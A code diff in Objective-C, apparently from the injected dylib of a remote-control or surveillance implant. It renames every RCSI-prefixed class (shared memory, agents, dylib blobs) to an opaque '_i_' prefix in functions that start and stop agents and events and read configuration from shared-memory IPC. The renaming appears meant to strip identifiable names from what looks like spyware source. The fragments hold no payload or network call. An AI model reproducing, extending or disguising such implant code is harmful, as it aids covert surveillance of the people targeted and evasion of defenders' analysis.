@@ -224,7 +224,7 @@ void catch_me()
   shMemoryHeader->commandDataSize = 0;
   shMemoryHeader->timestamp       = 0;
   
-  [[RCSISharedMemory sharedInstance] writeIpcBlob: theData];
+  [[_i_SharedMemory sharedInstance] writeIpcBlob: theData];
   
   [theData release];
   
@@ -248,7 +248,7 @@ void catch_me()
   shMemoryHeader->commandDataSize = 0;
   shMemoryHeader->timestamp       = 0;
   
-  [[RCSISharedMemory sharedInstance] writeIpcBlob: theData];
+  [[_i_SharedMemory sharedInstance] writeIpcBlob: theData];
   
   [theData release];
   
@@ -330,7 +330,7 @@ void catch_me()
 #pragma mark - Event management 
 #pragma mark -
 
-- (dylibEvents*)eventAllocate:(RCSIDylibBlob*)aBlob
+- (dylibEvents*)eventAllocate:(_i_DylibBlob*)aBlob
 {
   dylibEvents *event = nil;
   
@@ -343,7 +343,7 @@ void catch_me()
   return event;
 }
 
-- (dylibEvents*)getEventFromBlob:(RCSIDylibBlob*)aBlob
+- (dylibEvents*)getEventFromBlob:(_i_DylibBlob*)aBlob
 {
   dylibEvents *event = nil;
   
@@ -377,13 +377,13 @@ void catch_me()
     }
 }
 
-- (void)startEvent:(RCSIDylibBlob*)aBlob
+- (void)startEvent:(_i_DylibBlob*)aBlob
 {
   dylibEvents *event = [self getEventFromBlob:aBlob];
   [event start];
 }
 
-- (void)stopEvent:(RCSIDylibBlob*)aBlob
+- (void)stopEvent:(_i_DylibBlob*)aBlob
 {
   dylibEvents *event = [self getEventFromBlob:aBlob];
   [event stop];
@@ -393,7 +393,7 @@ void catch_me()
 #pragma mark - Agents management 
 #pragma mark -
 
-- (NSData*)getConfigData:(RCSIDylibBlob*)aBlob
+- (NSData*)getConfigData:(_i_DylibBlob*)aBlob
 {
   NSData *retData = nil;
   
@@ -405,9 +405,9 @@ void catch_me()
   return retData;
 }
 
-- (RCSIAgent*)agentAllocate:(RCSIDylibBlob*)aBlob
+- (_i_Agent*)agentAllocate:(_i_DylibBlob*)aBlob
 {
-  RCSIAgent *agent = nil;
+  _i_Agent *agent = nil;
   
   switch ([aBlob type]) 
   {
@@ -444,9 +444,9 @@ void catch_me()
   return agent;
 }
 
-- (RCSIAgent*)getAgentFromBlob:(RCSIDylibBlob*)aBlob
+- (_i_Agent*)getAgentFromBlob:(_i_DylibBlob*)aBlob
 {
-  RCSIAgent *agent = nil;
+  _i_Agent *agent = nil;
   
   uint agentId = [aBlob type];
   
@@ -476,24 +476,24 @@ void catch_me()
 {
   for (int i=0; i < [mAgentsArray count]; i++) 
     {
-      RCSIAgent *agentTmp = [mAgentsArray objectAtIndex:i];
+      _i_Agent *agentTmp = [mAgentsArray objectAtIndex:i];
       [agentTmp stop];
     }
 }
 
-- (void)startAgent:(RCSIDylibBlob*)aBlob
+- (void)startAgent:(_i_DylibBlob*)aBlob
 {
-  RCSIAgent *agent = [self getAgentFromBlob:aBlob];
+  _i_Agent *agent = [self getAgentFromBlob:aBlob];
   [agent start];
 }
 
-- (void)stopAgent:(RCSIDylibBlob*)aBlob
+- (void)stopAgent:(_i_DylibBlob*)aBlob
 {
-  RCSIAgent *agent = [self getAgentFromBlob:aBlob];
+  _i_Agent *agent = [self getAgentFromBlob:aBlob];
   [agent stop];
 }
 
-- (void)setDylibName:(RCSIDylibBlob*)aBlob
+- (void)setDylibName:(_i_DylibBlob*)aBlob
 {
   blob_t *_Blob = (blob_t*)[[aBlob blob] bytes];
   
@@ -506,7 +506,7 @@ void catch_me()
 #pragma mark - Blobs management 
 #pragma mark -
 
-- (void)checkAndUpdateConfigId:(RCSIDylibBlob*)aBlob
+- (void)checkAndUpdateConfigId:(_i_DylibBlob*)aBlob
 {
   if ([aBlob configId] > mConfigId)
     {
@@ -516,7 +516,7 @@ void catch_me()
     }
 }
 
-- (void)doit:(RCSIDylibBlob*)aBlob
+- (void)doit:(_i_DylibBlob*)aBlob
 {
   switch ([aBlob type]) 
   {
@@ -548,7 +548,7 @@ void catch_me()
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  NSMutableArray *blobs = [[RCSISharedMemory sharedInstance] getBlobs];
+  NSMutableArray *blobs = [[_i_SharedMemory sharedInstance] getBlobs];
   id blob = nil;
   
   for (int i=0; i < [blobs count]; i++) 
@@ -589,7 +589,7 @@ void catch_me()
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  RCSISharedMemory *sharedMem = [RCSISharedMemory sharedInstance];
+  _i_SharedMemory *sharedMem = [_i_SharedMemory sharedInstance];
   
   if ([sharedMem createDylibRLSource] != kRCS_SUCCESS)
     return;
